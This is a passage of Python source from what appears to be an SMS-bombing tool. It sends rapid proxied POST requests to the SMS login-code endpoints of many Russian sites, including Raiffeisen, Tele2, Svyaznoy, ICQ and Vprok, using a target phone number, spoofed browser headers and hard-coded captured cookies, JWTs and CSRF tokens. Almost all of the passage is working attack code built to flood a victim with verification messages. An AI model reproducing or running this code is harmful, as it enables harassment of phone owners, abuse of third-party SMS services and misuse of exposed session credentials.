                        'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIzODFlYzZlZi1hOGFmLTQ5NDgtYmFjYS01NDliM2ZjZTg1N2QiLCJhbm9ueW1vdXMiOiJUcnVlIiwic2lkIjoiNTVkOGFlMTAtODYxZi00NGI0LWFmMzEtZjMwYmYxNjk1YjgyIiwiZGV2aWNlaWQiOiJkOGUzZDU1YTRkYTE1NzI4Mjg5OGE3MjIwODQ5OWNmZCIsInR5cGUiOiJBY2Nlc3MiLCJleHAiOjE2NjgwMzM5MjQsImlzcyI6ImFwLmxlb21heC5ydSIsImF1ZCI6ImFwLmxlb21heC5ydSJ9.qME5o3Qh4sNNv-3iQ0sxaH5KKWoXlukGXq63q6QfVt8',
                        'Connection': 'keep-alive',
                        'Content-Length': '24',
                        'Content-Type': 'application/json',
                        'Cookie': '__ddg1_=xl7dki0N0qhMTlUiS9iY; deviceId=d8e3d55a4da157282898a72208499cfd; token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIzODFlYzZlZi1hOGFmLTQ5NDgtYmFjYS01NDliM2ZjZTg1N2QiLCJhbm9ueW1vdXMiOiJUcnVlIiwic2lkIjoiNTVkOGFlMTAtODYxZi00NGI0LWFmMzEtZjMwYmYxNjk1YjgyIiwiZGV2aWNlaWQiOiJkOGUzZDU1YTRkYTE1NzI4Mjg5OGE3MjIwODQ5OWNmZCIsInR5cGUiOiJBY2Nlc3MiLCJleHAiOjE2NjgwMzM5MjQsImlzcyI6ImFwLmxlb21heC5ydSIsImF1ZCI6ImFwLmxlb21heC5ydSJ9.qME5o3Qh4sNNv-3iQ0sxaH5KKWoXlukGXq63q6QfVt8',
                        'Host': 'ap.leomax.ru',
                        'Origin': 'https://auth.k8s.leomax.ru',
                        'Referer': 'https://auth.k8s.leomax.ru/',
                        'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"macOS"',
                        'Sec-Fetch-Dest': 'empty',
                        'Sec-Fetch-Mode': 'cors',
                        'Sec-Fetch-Site': 'same-site',
                        'User-Agent': user
                    }

                    payload = {"phone": "+" + phone}

                    await session.post('https://ap.leomax.ru/siteapi/auth/authcode', json=payload, headers=header,
                                  proxy=proxy_2, timeout=1)
                    self.r = str(int(self.r) + 1)
                    self.stat()
                except:
                    self.r2 = str(int(self.r2) + 1)
                    self.stat()
                try:
                    header = {
                        'Accept': 'application/json, text/javascript, */*; q=0.01',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Accept-Language': 'fr-FR,fr',
                        'Connection': 'keep-alive',
                        'Content-Length': '24',
                        'Content-Type': 'application/json',
                        'Cookie': 'mobile=false; device=pc; geo_site=www; geo_region_url=www; site_city=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0; site_city_id=2; APPLICATION_CONTEXT_CITY=21; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2022-11-09%2021%3A48%3A08%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.raiffeisen.ru%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2022-11-09%2021%3A48%3A08%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.raiffeisen.ru%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Macintosh%3B%20Intel%20Mac%20OS%20X%2012_2_1%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F106.0.0.0%20Safari%2F537.36; _ga=GA1.2.1662387916.1668026888; _gid=GA1.2.811000822.1668026888; _gat=1; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.raiffeisen.ru%2F',
                        'Host': 'oapi.raiffeisen.ru',
                        'Origin': 'https://www.raiffeisen.ru',
                        'Referer': 'https://www.raiffeisen.ru/',
                        'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"macOS"',
                        'Sec-Fetch-Dest': 'empty',
                        'Sec-Fetch-Mode': 'cors',
                        'Sec-Fetch-Site': 'same-site',
                        'User-Agent': user
                    }

                    payload = {
                        'number': phone
                    }

                    await session.post('https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code/sms', json=payload,
                                  headers=header, proxy=proxy_2, timeout=1)
                    self.r = str(int(self.r) + 1)
                    self.stat()
                except:
                    self.r2 = str(int(self.r2) + 1)
                    self.stat()
                try:
                    header = {
                        'Accept': '*/*',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Accept-Language': 'fr-FR,fr',
                        'Connection': 'keep-alive',
                        'Content-Length': '75',
                        'Content-type': 'application/json',
                        'Cookie': 'city=izhevsk; city_is_confirmed=1; XSRF-TOKEN=eyJpdiI6IlZwTE9tYUtoVTZhVkpYQ3JnUW9PbFE9PSIsInZhbHVlIjoidWlST2xNa1pvbzVRdDVqY1daRTVQYXBuK25Mb1R6bFR3bG5SYUJZZ05wYVZHQ3BIcjBVZXBGOFNlYVdLUUMrMWU4cGpHRnZlcHV5N2tGdThIbWdiMGc9PSIsIm1hYyI6ImNiYTQ2YzcwMDk5ZGE4YzJiMDE3NTcxOTJhNDVjMjViYTY1NWI0NGYxMDI2ODEzNDYyMDQ4Mzc1NzJiZWMxMWQifQ%3D%3D; b-apteka_session=eyJpdiI6IjcrTWJyM21aa3lvME1UaXcrRVIxWkE9PSIsInZhbHVlIjoiN29pME5hZ05RYU9Cc2lVMW1Vdk0yMG4zUjBhVUdaUFwvWnFYNzBubG9TNkdPcnk0WDZZRE00c1BTRlRISXRhczdxMm5QTWYrOTlaWDVORGFsMmszdmJ3PT0iLCJtYWMiOiJmNWRkYzJhMWMzMWUyYTY3MzBlOGQzNWFmOTdkYjA3OWE4ZTIyOWE1NDI3ZTU2OWNmYzA1MDRhYzM3ZTgwZGFmIn0%3D',
                        'Host': 'b-apteka.ru',
                        'Origin': 'https://b-apteka.ru',
                        'Referer': 'https://b-apteka.ru/lk/login',
                        'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"macOS"',
                        'Sec-Fetch-Dest': 'empty',
                        'Sec-Fetch-Mode': 'cors',
                        'Sec-Fetch-Site': 'same-origin',
                        'User-Agent': user,
                        'X-Requested-With': 'XMLHttpRequest'
                    }

                    payload = {
                        "phone": phone,
                        "_token": "G342Mr1Pf7bDbpQ3qdqxByzuyjG08yHr8i9TbtpR"
                    }

                    await session.post('https://b-apteka.ru/lk/send_confirm_code', json=payload, headers=header)
                except:
                    self.r2 = str(int(self.r2) + 1)
                    self.stat()
                try:
                    header = {
                        'accept': 'application/json, text/plain, */*',
                        'accept-language': 'fr-FR,fr',
                        'content-length': '18',
                        'content-type': 'application/json',
                        'cookie': 'language=ru-RU; user-separator=part1; language=ru-RU; session-cookie=1726063975251ab3f60c6a976940ac7285525d89dcb927fe1d60ec46cae73ef49059592ea3ef326a51e3f2f08d6353e1; auth_state=NOT_AUTH; kc_config={%22realm%22:%22tele2-b2c%22%2C%22clientId%22:%22digital-suite-web-app%22%2C%22url%22:%22%22%2C%22updateTimeBeforeExpiration%22:60%2C%22defaultRefreshInterval%22:60%2C%22requestSetTokenTimeout%22:15%2C%22requestSetTokenRetry%22:2%2C%22requestSetTokenRetryDelay%22:2%2C%22requestUpdateTokenTimeout%22:10%2C%22requestUpdateTokenRetry%22:8%2C%22requestUpdateTokenRetryDelay%22:2%2C%22cookieDomain%22:%22.tele2.ru%22%2C%22isActive%22:true%2C%22smsCodeLength%22:6%2C%22migration%22:true%2C%22skylinkCookieDomain%22:%22.skylink.ru%22}; Test_try={%225500001%22:1}; csrf-token-name=csrftoken; JSESSIONID=yC1eMKbGBrnLyukyFZ7-at-Q5ZKp8MA6JlTGL06bkjt_o0QFjCZQ!-550992005; NSC_ESNS=a0366d2d-14a5-136c-9678-c223c06207fc_0765662115_1895704033_00000000019867210692; csrf-token-value=1726063c60de4ab6c4943efca7bc968c764caec84dde01522c0a8f7ae9d5608427191ccb48f76353',
                        'origin': 'https://msk.tele2.ru',
                        'referer': 'https://msk.tele2.ru/?pageParams=askForRegion%3Dtrue',
                        'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"macOS"',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'same-origin',
                        'tele2-user-agent': 'web',
                        'user-agent': user,
                        'x-ajax-token': 'b382122191e9582bd66d958796abe7397c63a42c493c56ca4b8acfc965e7b11c',
                        'x-csrftoken': '172606399efc805c7c4123a0dfeff94afb700ee884ccd72ecf2206201ee028c941f18bf7f5acf1e8',
                        'x-request-id': 'HVRe0j56mcGaJpdnoFXqxBg89wQfLsA7OkvDzurS',
                        'x-requested-with': 'XMLHttpRequest'
                    }

                    payload = {
                        'sender': "Tele2"
                    }

                    await session.post(f'https://msk.tele2.ru/api/validation/number/{phone}', json=payload, headers=header,
                                  proxy=proxy_2, timeout=1)
                    self.r = str(int(self.r) + 1)
                    self.stat()
                except:
                    self.r2 = str(int(self.r2) + 1)
                    self.stat()
                try:
                    header = {
                        'accept': '*/*',
                        'accept-encoding': 'gzip, deflate, br',
                        'accept-language': 'fr-FR,fr',
                        'content-length': '0',
                        'cookie': 'favoriteProducts=%5B%5D; CITY_CONFIRM=true; without_critical=1; reuserid=d2314c12-cce6-46e1-8955-1173e60338f7; O_ZONE_ALIAS=msk; O_CITY_ID=133; SETCITY=133; dtCookie=v_4_srv_1_sn_689C90C537E1DB01B95EB82A7DEBB5E6_perc_100000_ol_0_mul_1_app-3Aea7c4b59f27d43eb_1; mindboxDeviceUUID=163d88b7-873b-47e8-8156-0cab2973c9f1; directCrm-session=%7B%22deviceGuid%22%3A%22163d88b7-873b-47e8-8156-0cab2973c9f1%22%7D; SITE_SESSID=og4i452ghf6iv1of9c8r00eqr0; branch=K; cf_clearance=e2a2205501dafb3bf87873b2124c0738bea5693a-1667590180-0-150; _cfuvid=7qo8NDtZ3jsi4WBHzUZ1snKrNVf93UHPrbDxrEKBVTc-1668027960075-0-604800000; searchPlaceholder=Apple%2520MacBook; BASKET_COUNT=0; __cf_bm=FUlOJxiHHM2NF7yFFQqufh5_RxESugWb5_Gt93wl8Fw-1668027962-0-AUwqQ15CtADoXAccMeA3g0WbzmrgCD2/QcylobSrjQdLiQx1cJfIsx+AGxZCn0ZH21eecYku/+MJ07yrSE3tSrQY/RjEr4r9V4a8ZJsYdmI9f27uS9tdy0FEuyTpuyHcty6s6eGB7+V0UkUkn4A/Hkt81gTBzVLAKShMCv7SUKwb0oYRN35EAd5y3SGSzZHghg==',
                        'origin': 'https://www.svyaznoy.ru',
                        'referer': 'https://www.svyaznoy.ru/',
                        'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"macOS"',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'same-origin',
                        'user-agent': user,
                        'x-requested-with': 'XMLHttpRequest'
                    }

                    await session.post(f'https://www.svyaznoy.ru/api/v2/sms-verification-code/{phone[1:]}', headers=header,
                                  proxy=proxy_2, timeout=1)
                    self.r = str(int(self.r) + 1)
                    self.stat()
                except:
                    self.r2 = str(int(self.r2) + 1)
                    self.stat()
                try:
                    header = {
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Accept-Language': 'fr-FR,fr',
                        'Cache-Control': 'max-age=0',
                        'Connection': 'keep-alive',
                        'Content-Length': '16',
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Cookie': 'PHPSESSID=uutvbqgetdp7hrktod41sk70b3; _fbp=fb.1.1668028718954.379549720',
                        'Host': 'www.frotels.com',
                        'Origin': 'https://www.frotels.com',
                        'Referer': 'https://www.frotels.com/appsendsms.php',
                        'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"macOS"',
                        'Sec-Fetch-Dest': 'iframe',
                        'Sec-Fetch-Mode': 'navigate',
                        'Sec-Fetch-Site': 'same-origin',
                        'Upgrade-Insecure-Requests': '1',
                        'User-Agent': user
                    }

                    payload = {
                        'mobno': phone
                    }

                    await session.post('https://www.frotels.com/appsendsms.php', data=payload, headers=header,
                                  proxy=proxy_2, timeout=1)
                    self.r = str(int(self.r) + 1)
                    self.stat()
                except:
                    self.r2 = str(int(self.r2) + 1)
                    self.stat()
                try:
                    header = {
                        'accept': 'application/json, text/plain, */*',
                        'accept-encoding': 'gzip, deflate, br',
                        'accept-language': 'ru',
                        'content-length': '60',
                        'content-type': 'application/json',
                        'dnt': '1',
                        'origin': 'https://wheely.com',
                        'referer': 'https://wheely.com/',
                        'sec-ch-ua': '"Opera GX";v="89", "Chromium";v="103", "_Not:A-Brand";v="24"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"Windows"',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'same-site',
                        'user-agent': user,
                        'x-wheely-sign': 'eyJ0eXBlIjoiY2FwdGNoYSIsInNpZ25hdHVyZSI6IlAwX2V5SjBlWEFpT2lKS1YxUWlMQ0poYkdjaU9pSklVekkxTmlKOS5leUp3WVhOemEyVjVJam9pTkVkemJqUnlaMVpTUjAxMWNFZHNiMGxLT0ZwT1NURjNTMVpxWjBkNGVqWmhSVEUwZVd0SVEyTlJWR2cwV0hWTE5qQndOMlZZYUVsNlEwazRTakZVTXpsalEycE9RWGw2Vm1oS2QzQjBjbGQ1TlZaQ1NVNUVaRzFsTkZGRlIydG1iMDl6TVVSaFoyeDJaVnBIVnpObGFGWXpZa1kyY1VZeFdIQXpZa3c0TVdwTVJVaFhkbTQ0Ymtvek1GZE5SRUUzZFhSWVdsSjVTblIzWjNBeU1sTkZNemhEVjFCa1JGZGFSMXBpTXprNE5HSXlOa3huZURWVmJHaFdhRkZQYnpCcGRHbGFkMnRSZWpBclRVTTJka2t3ZFVOdFNHOURRbXhOUVUwM1dWVm1aVTQ0TDI5c04yRm9XbUY2TW1GMFYyMW9Ra2h0TkZaeFlUTkZOa1ZsT0VWdlJtOWtRWE12Y0VOdU1IbERXbk42T0M5VWMxYzJZVTlGYnpoQk5EZEdhbUprZWpaYU5XeEdObUU0VjBzd1UzQkJOVFZPYm1samEyWnRlVXRuWjBOeVQwaEhXRVJvV1RkamJIRTRObTltTTNkaVUyaHRhbUZMV0NzNU9EbFZla2RXVDB4WlJ6VXpVRzQxV1dGSkwzQXZRbUZXWWpaUFYzY3pjRWxOVUZGeFUzSnFPVW80ZG5KQmVscEtVV3RtYUdWU1JtTjFSUzlwYmxSVFF6Sk1RelZxT1VoSU4xZzNVRlJoTXpCWldrZ3JUVmxQUm1RNE9XRTBUbmhrUmtzcmJFTmhhMlYwV0UwMFdIaGplRFV3UTFKSVpWVlRaek5zYTFaVlZIaExVVGx0Wmxwa04wUlphRXhUWVRodU1DOURiSGhIVVdGcFdVOXhjRWg0U0RCeFdsSXpjM1ZIUjBWak4ySTBVRmxJWjNaaksydE5hVU41U0ZFemFWWnVRemxGVFhkNFJHdDZVMmM0ZEZocWVHZENlbnB3YjFJelNscFhRM2hsWkZZMGNUWjNlak15TkVoUmNtVnFjbWN3YWs0eWFYaDRlWHBsWlRBM1VsTXdTMnBzTVRkbmNVNDJkM0ZWVVM5V1V6VTNNM1JTZUdwS1JYVjVOV2RZWlc1WU5VRlFjRFpZYmxaWldUa3JXRTVxZUd4bFozVXZZVTB2Y1V4UU9Xb3ZjMHQxSzA5WWFrOUdTemxKUTBnM05EZHJjRWN5TTJreFkxcExRVzg0V21neWNsVnJhblpzUTA1cmVsUnBRV3QzTXpabk55ODJVWE01YXpaU1IwNXNjM0ZWTldwS1drcHhMMVF5ZEVwVk9WRnJlRzFoTUdzMFlXdHliR2Q1UkZGVVZtaHBlV1ZFV1ZWVGNYSkhUM0oxY1haYU1TOXRNbEJuVGpkV01FVXZOMjFaYUdGelNESnVTR2RpVTBsamVXcFdhVmQwVW5KUlFtbFVjVzlVZW05blpUbFFjMFpwTlhCUVFubEdUVFpOVDFWNFRuRnFWV2xOUkdKT00wTlFWRVpyWTNBNE5FTkpaV1pNTm1Kck5FSjZZM29yU21OdFNqSm9jV3RrZFRoSU5UWjNWRmRJUjNWUE1uUlFkWFJGWW1KTU9FdHVXRmh0TlRWNlUwbHJUVXB3YTBGeFRGZ3JSV3cwYkZwSFNETTRTM05qY0RFd09DczJNV2RpU2tGRFoyWkNWa2hXYURkbFRqUkpUbEpUVEdVeGIyWjZPWFZHWlhkV1drSXpZa05oUTBkMGRuUm1Ta1pHVUhwWFluWm9NM0ZqSzNWYWEzbHBOR056WTBsT2QzSndRMVJZY2sxR05XaGhiVXBOTm0xd1NEWTVkRzB2V0had1NVZG9aWEF3VFhCcGNHVkxXREV5VDFCM09ERjFjRU5YVDJSMU4wbHlabk5wUW1waVFrUkdOMHBxY0dkaVowOTVkMUZaWTFSeWVFODFTWGhzZFRkWWNVOUVjbEpLYVRSalZUTnJOM3AyVjJSTlpVNDVjV1pTU0hkeVowSk1PR3MyVUhCYU5DOXpjSFJ3TXpJNVEzVXZLM2hIVUdjemJtdFhXV3RSZFd4SmRWRlZUV3hSUTI5UVkxQlhNV3Q2WVVsRGNrVnllVGhEVkRSUVZsaGxWa2xYVEhrNWRHWjRaak5KVkdoTFpERm9NV2hGWWpsVFNtaHljRVY1TVhGaGVIVTJaeXRqZG1WQmQwRm1SVUpvZVhoTk9XeFZVMWhFUnpadlEwcDFOblJUZERWNVVGaERNRWhoYURFNGRUTXJVRFE1VEV4UmNGQkNUeXRtVkdwbVdVSjRVM1ZyZHpKc2FUTlRUbXhESzNsRlJFNUZNbmswTDJZd1dIY3dSMG8wWVdOYVFrNDNkVXhTVFdOb01YcG1NWGgwTkRGWE9WUm9iM3BtWTNKNlRucHVXRGRsY3k5dmRGaDJTM0ZMWm1OR2NHRlZNVWxSZEU1M1VXNVdjbTF5Um5wbFJuUmlkbFJZTjBkRFFrdFRVRUpyUVUxVVJuRktOR1ZOVTNoM2NrZG1kMGRUVUdSTGFDdEpWSFpXVEV4RFEwdEdhR04yZVhwWVpXOXJTWEUyTmpKd1JVbENlQ3Q2T0hwdmNHVjVhVUYyVURFek55czJSSFJSTlZwYWNISlpSbEFpTENKbGVIQWlPakUyTmpnd01qazBORFlzSW5Ob1lYSmtYMmxrSWpvek16azFNVEF6TURNc0luQmtJam93ZlEuaEQ4RHIzRFRxenRZb3JzNTQ0ZjJRQzVsQ0V6LVY1WkhDeWZJNFFtcmdpbyJ9'
                    }

                    payload = {
                        'app_id': "55e085968a5da59241000001",
                        'phone': "+" + phone
                    }

                    await session.post('https://api.wheely.com/v6/auth/oauth/token', json=payload, headers=header,
                                  proxy=proxy_2, timeout=1)
                    self.r = str(int(self.r) + 1)
                    self.stat()
                except:
                    self.r2 = str(int(self.r2) + 1)
                    self.stat()
                try:
                    header = {
                        'accept': '*/*',
                        'accept-encoding': 'gzip, deflate, br',
                        'accept-language': 'fr-FR,fr',
                        'content-length': '141',
                        'content-type': 'application/json',
                        'origin': 'https://web.icq.com',
                        'referer': 'https://web.icq.com/',
                        'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"macOS"',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'cross-site',
                        'user-agent': user
                    }

                    payload = {"reqId": "85231-1668029727",
                               "params": {"phone": phone, "language": "en-US", "route": "sms",
                                          "devId": "ic1rtwz1s1Hj1O0r",
                                          "application": "icq"}}

                    await session.post('https://u.icq.net/api/v89/rapi/auth/sendCode', json=payload, headers=header,
                                  proxy=proxy_2, timeout=1)
                    self.r = str(int(self.r) + 1)
                    self.stat()
                except:
                    self.r2 = str(int(self.r2) + 1)
                    self.stat()
                try:
                    header = {
                        'accept': '*/*',
                        'accept-encoding': 'gzip, deflate, br',
                        'accept-language': 'fr-FR,fr',
                        'content-length': '231',
                        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                        'cookie': 'uid=UbGokWNsHtsam06bAwXMAg==; .ASPXANONYMOUS=aLtF3Euak0aI0S9e42PDHw; _SL_=6.83.; _ipl=6.83.; __utmz=utmccn%3d(not%20set)%7cutmcct%3d(not%20set)%7cutmcmd%3d(none)%7cutmcsr%3d(direct)%7cutmctr%3d(not%20set); __utmx=utmccn%3d(not%20set)%7cutmcct%3d(not%20set)%7cutmcmd%3d(none)%7cutmcsr%3d(direct)%7cutmctr%3d(not%20set); AB_CREDITSELECTION=Test_000195_A; AB_CREDITSELECTION_DIRECT=never; .AspNetCore.Antiforgery.vnVzMy2Mv7Q=CfDJ8GIymPxtm1FFmKVQVGA7i3eSw5EuDlEAI6yoUR-lLFuhs6PZSKZSYC69yd-ImQtg7VMTVs-YREVxcAm9pTBRdll6qirhjMSoXp20s8hxsTbAL6O3BZFBlhYZ_8Nf00Qvpcpt1dmrE5oyGos4nyJcoes; __cf_bm=ZjbtEUV9dl1mEJNlE4WHlqfswV2gFvh28__bRnhiZbc-1668030211-0-AUO7xru8loJtNzO2Ffv6rNJrjJnYGpb5KYOMSIokmdlEk8VF/XY1xx/aKWrJWuHqh1Bqhq8nPhFdWeylZhzgjy1pKA+V7XExgqMhepF+s63F; _cfuvid=VvENPoiZRWhMICqFKfY413RVyf_TwT4WmJFCPZPVJiM-1668030211698-0-604800000',
                        'origin': 'https://my.sravni.ru',
                        'referer': 'https://my.sravni.ru/signin?ReturnUrl=%2Fuser%2Fprofile',
                        'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"macOS"',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'same-origin',
                        'user-agent': user
                    }

                    payload = {
                        '__RequestVerificationToken': 'CfDJ8GIymPxtm1FFmKVQVGA7i3c6GdbFf41SftrzCGJ0NjJWXj04eT9whWjnEE37nwuELHlp42n3cj3_8E36WbypiKwpbcwu7ykP40eOWeONUwI7q_hRaxaTJ2pIqKFx5bB3tWc72gaHTsA2npAdpsIh2OA',
                        'phone': '+' + phone,
                        'returnUrl': '/user/profile'
                    }

                    await session.post('https://my.sravni.ru/signin/code', data=payload, headers=header, proxy=proxy_2, timeout=1)
                    self.r = str(int(self.r) + 1)
                    self.stat()
                except:
                    self.r2 = str(int(self.r2) + 1)
                    self.stat()
                try:
                    header = {
                        'accept': 'application/json, text/plain, */*',
                        'accept-encoding': 'gzip, deflate, br',
                        'accept-language': 'fr-FR,fr',
                        'content-length': '17',
                        'content-type': 'application/x-www-form-urlencoded',
                        'cookie': 'region=1; deliveryTypeId=1; standardShopId=2527; luuid=73c0fa54-2927-4afa-a372-6004f8647bb6; suuid=d739609b-436f-4502-a032-67dba9fdc97e; XSRF-TOKEN=eyJpdiI6IjNRXC84aFdpcWdIcys0d2F0M1I2WU9RPT0iLCJ2YWx1ZSI6IjdGejB4M29SQ2ozR2FLV1BiNmxidEc0dmU1WUREZ0VoNWV0QjNUdzMycTg3NjlPaXRcL1RKT29NVzIyR3E2Mk4waHlSZE1oRXAwN0s5YzlFNnB6Z2QrQT09IiwibWFjIjoiODAxZmZlOGU5YWQ5ZTU2MmE0YjRjNmJmY2QzYzE0MWQyMzMzZjUxMDYyYzAwNGI5NzBhNTI4NGRlODg3OGIzNyJ9; access_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJhdWQiOiI5IiwianRpIjoidXVpZDczYzBmYTU0LTI5MjctNGFmYS1hMzcyLTYwMDRmODY0N2JiNjBmZDJlNzVkMjNlMDQ5MWQ4MGRkMTgzOGU0NmY1YWYwODliMTJhYWMiLCJpYXQiOjE2NjgwMzA1OTguMjU0ODMyLCJuYmYiOjE2NjgwMzA1OTguMjU0ODM0LCJleHAiOjE2NjgxMTY5OTguMjUxNTQsInN1YiI6IiIsInNjb3BlcyI6W10sInNwbGl0X3NlZ21lbnQiOjl9.B-C8hM2_ZfrY4QdYvmqbZQFgfUbcrOYb40F_5rpzUuS086BFGi1WelZVdavOhFeUKR7o8AT9rLKIQ7SvO_i4WwB1gJ7NCPwqNq8saUHSMIqoZruJiNPOTa_fyYAJGXaOLekVK984_84tohSyVPp6CgM1HtXD8lvKSD1tnDhtP7SjFaazKnD4YwkHeT0mJsi4smjX-XsMJN9Z3A2y5-0GT6HEol93jKlXNw3wsBR_7ZJ_vpIT9waE9w-tIs21HvCW6Ad6j5Okn0lO2MtYZ5KuP63UBFj3BERVx7GJTIRKbjFMzS6tb0jw1pQkMX_k86d181wsPZagCOW9cxSMpcxP1O8rDP_MVLk-Y53c3Ap3R-3EhdWYyex74Pua6ZOBerNu_Eg6wM2KcTQQOyOY3jdtQ5BUg7orMtkmxA5ua6NGlaJeNmDqbQDwsZSMF7kbpzI5YRjg8lSy6rUHUJQCHDKCSHaVCVnO65IjNru1qZ5B0AgWeNE85vf5EgDx5IvviHzVCz4QAkztlhqpebCZ4rM992-As26eSZZN_gYY1e38xehoXFwS1tDhWr5jWQMbgOlAfSj649353BXO-iPQ10_NS81g-1579ZxF6f9HtmuGe7gm_5WtNkEpH2SSDaVasXNo45Gh23DMWGLw1JA64LfU3RNlHMdoRDPfVfgRNzzG5rs; split_segment_amount=11; aid=eyJpdiI6InBvZnl6VVp2WWhMSUdGTXBpSEJZeHc9PSIsInZhbHVlIjoia0ZQSTd0RFwvTVRWV3I0M2ZyamZxN3N2R3d2Vmg2S0V4bGJBRWFlckY5YkZ4V0srWWhybzRDM3JYaVRQa0cwNzVsUWllSkZhSHhEWXE0bzlGQUxqc2p3PT0iLCJtYWMiOiIyYjUxOWEyYjU5MzAwNDcyMTRiMmQ3NmIzMWE1YjJkNzgyNzg0NGM5MDRlNzgxOWM4NGI1MWQ4OTdhZjYyZDJmIn0%3D',
                        'origin': 'https://www.vprok.ru',
                        'referer': 'https://www.vprok.ru/',
                        'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"macOS"',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'same-origin',
                        'user-agent': user,
                        'x-xsrf-token': 'eyJpdiI6IjNRXC84aFdpcWdIcys0d2F0M1I2WU9RPT0iLCJ2YWx1ZSI6IjdGejB4M29SQ2ozR2FLV1BiNmxidEc0dmU1WUREZ0VoNWV0QjNUdzMycTg3NjlPaXRcL1RKT29NVzIyR3E2Mk4waHlSZE1oRXAwN0s5YzlFNnB6Z2QrQT09IiwibWFjIjoiODAxZmZlOGU5YWQ5ZTU2MmE0YjRjNmJmY2QzYzE0MWQyMzMzZjUxMDYyYzAwNGI5NzBhNTI4NGRlODg3OGIzNyJ9'
                    }

                    payload = {
                        'phone': phone
                    }

                    await session.post('https://www.vprok.ru/as_send_pin', data=payload, headers=header, proxy=proxy_2, timeout=1)
                    self.r = str(int(self.r) + 1)
                    self.stat()
                except:
                    self.r2 = str(int(self.r2) + 1)
                    self.stat()
                try:
                    header = {
                        'accept': '*/*',
                        'accept-encoding': 'gzip, deflate, br',
                        'accept-language': 'fr-FR,fr',
